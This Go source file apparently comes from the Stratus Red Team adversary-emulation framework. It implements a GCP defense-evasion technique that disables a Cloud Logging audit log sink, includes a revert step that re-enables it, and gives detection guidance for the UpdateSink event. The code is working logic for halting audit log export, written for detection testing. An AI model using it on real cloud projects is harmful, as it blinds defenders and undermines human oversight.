package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	logging "google.golang.org/api/logging/v2"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.disable-logging-sink",
		FriendlyName: "Disable a GCP Log Sink",
		Description: `
Disables a Cloud Logging sink that exports audit logs to a storage destination.
Simulates an attacker temporarily halting audit log export to impair detection,
without permanently destroying the sink configuration.

Warm-up:

- Create a GCS bucket
- Create a log sink exporting audit logs (<code>cloudaudit.googleapis.com</code>) to the bucket

Detonation:

- Disable the log sink by setting its <code>disabled</code> field to <code>true</code>

Revert:

- Re-enable the log sink by setting its <code>disabled</code> field back to <code>false</code>

References:

- https://cloud.google.com/logging/docs/export/configure_export_v2
- https://cloud.google.com/logging/docs/reference/v2/rest/v2/projects.sinks/update
- https://attack.mitre.org/techniques/T1562/008/
- https://redcanary.com/threat-detection-report/trends/cloud-attacks/
`,
		Detection: `
Identify when a log sink is updated using the GCP Admin Activity audit log event
<code>google.logging.v2.ConfigServiceV2.UpdateSink</code>. Inspect the request to check
whether the <code>disabled</code> field was set to <code>true</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func setSinkDisabled(providers stratus.CloudProviders, sinkName string, disabled bool) error {
	projectId := providers.GCP().GetProjectId()
	sinkPath := fmt.Sprintf("projects/%s/sinks/%s", projectId, sinkName)

	loggingService, err := logging.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to instantiate Cloud Logging client: %w", err)
	}

	sink, err := loggingService.Projects.Sinks.Get(sinkPath).Do()
	if err != nil {
		return fmt.Errorf("failed to get log sink %s: %w", sinkPath, err)
	}

	sink.Disabled = disabled
	_, err = loggingService.Projects.Sinks.Update(sinkPath, sink).UniqueWriterIdentity(true).UpdateMask("disabled").Do()
	if err != nil {
		return fmt.Errorf("failed to update log sink %s: %w", sinkPath, err)
	}

	return nil
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	sinkName := params["sink_name"]
	log.Println("Disabling log sink " + sinkName)
	if err := setSinkDisabled(providers, sinkName, true); err != nil {
		return err
	}
	log.Println("Successfully disabled log sink " + sinkName)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	sinkName := params["sink_name"]
	log.Println("Re-enabling log sink " + sinkName)
	if err := setSinkDisabled(providers, sinkName, false); err != nil {
		return err
	}
	log.Println("Successfully re-enabled log sink " + sinkName)
	return nil
}
